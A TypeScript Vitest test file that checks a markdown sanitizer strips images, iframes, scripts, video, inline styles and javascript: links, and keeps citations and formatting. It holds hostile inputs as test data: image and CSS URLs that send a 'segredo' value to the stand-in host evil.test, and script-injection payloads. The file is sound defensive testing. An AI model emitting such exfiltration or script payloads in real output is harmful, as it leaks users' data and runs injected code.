import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { compiler } from 'markdown-to-jsx';
import { safeMarkdownRenderRule } from '@/lib/markdownSafety';

const Citation = (props: { href: string; children?: unknown }) =>
  createElement(
    'a',
    { href: props.href, 'data-citation': '' },
    props.children as any,
  );

const render = (md: string) =>
  renderToStaticMarkup(
    compiler(md, {
      renderRule: safeMarkdownRenderRule,
      overrides: { citation: { component: Citation } },
    }),
  );

describe('safeMarkdownRenderRule', () => {
  it('never renders resource-loading or active tags', () => {
    const html = render(
      [
        'Texto <img src="https://evil.test/?d=segredo"> fim',
        '',
        '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
        '',
        '<script>alert(1)</script>',
        '',
        '<video src="https://evil.test/v.mp4"></video>',
        '',
        '<p style="background:url(https://evil.test/x)">ok</p>',
      ].join('\n'),
    );

    expect(html).not.toMatch(
      /<img|<iframe|<script|<video|srcdoc|style=|evil\.test/,
    );
    expect(html).toContain('ok');
  });

  it('turns markdown images into links instead of loading them', () => {
    const html = render('![resumo](https://evil.test/?d=segredo)');
    expect(html).not.toContain('<img');
    expect(html).toContain('href="https://evil.test/?d=segredo"');
    expect(html).toContain('>resumo</a>');
  });

  it('keeps citations, links and formatting', () => {
    const html = render(
      'Fato<citation href="https://a.test">1</citation> **forte** <b>b</b> <a href="javascript:alert(1)">x</a> [ok](https://b.test)',
    );
    expect(html).toContain('data-citation');
    expect(html).toContain('href="https://a.test"');
    expect(html).toContain('<strong>forte</strong>');
    expect(html).toContain('<b>b</b>');
    expect(html).not.toContain('javascript:');
    expect(html).toContain('href="https://b.test"');
  });
});
